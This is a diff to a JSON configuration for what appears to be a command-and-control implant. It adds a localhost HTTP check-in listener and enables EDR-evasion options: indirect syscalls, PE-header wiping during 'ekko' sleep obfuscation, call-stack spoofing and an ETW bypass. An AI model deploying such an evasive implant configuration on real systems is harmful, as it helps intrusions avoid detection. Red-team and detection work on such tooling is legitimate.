@@ -7,24 +7,47 @@
       "port": 6767,
       "path": "/api/checkin",
       "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "http_method": "GET",
       "max_consecutive_failures": 5,
       "backoff_sleep_ms": 10000,
-      "http_method": "POST"
+      "malleable_config": {
+        "wrapper": {
+          "prefix": "",
+          "suffix": ""
+        },
+        "payload_location": {
+          "type": "body",
+          "param_name": "q",
+          "path_prefix": "",
+          "path_suffix": "",
+          "body_content_type": "text/plain"
+        }
+      }
+    },
+    {
+      "type": "HTTP",
+      "host": "127.0.0.1",
+      "port": 6767,
+      "path": "/do/no/evil",
+      "user_agent": "donoevil",
+      "http_method": "POST",
+      "max_consecutive_failures": 5,
+      "backoff_sleep_ms": 10000
     }
   ],
   "sleep_ms": 5000,
   "jitter_pct": 20,
-  "use_indirect_syscalls": false,
+  "use_indirect_syscalls": true,
   "indirect_syscall_pivot": "ZwSetDefaultLocale",
-  "lazy_checkin": false,
+  "lazy_checkin": true,
   "lazy_checkin_max": 2,
   "lazy_unhook": false,
   "pad": true,
   "pad_max": 1024,
   "max_response_size": 67108864,
   "sleep_obfuscation": "ekko",
-  "sleep_wipe_pe_headers": false,
-  "sleep_stack_spoof": false,
+  "sleep_wipe_pe_headers": true,
+  "sleep_stack_spoof": true,
   "num_spoof_frames": 6,
   "stack_spoof_chain": [
     {
@@ -36,20 +59,20 @@
       "function": "BaseThreadInitThunk"
     },
     {
-      "module": "kernel32.dll",
-      "function": "VirtualAlloc"
-    },
-    {
       "module": "ntdll.dll",
       "function": "NtAllocateVirtualMemory"
+    },
+    {
+      "module": "kernel32.dll",
+      "function": "VirtualAlloc"
     }
   ],
   "kill_date": "2027-04-07",
   "options": {
     "sandbox_evasion": false,
     "debug_mode": false,
-    "bypass_etw": false,
-    "validate_ssl": false
+    "bypass_etw": true,
+    "validate_ssl": true
   },
   "malleable_config": {
     "wrapper": {
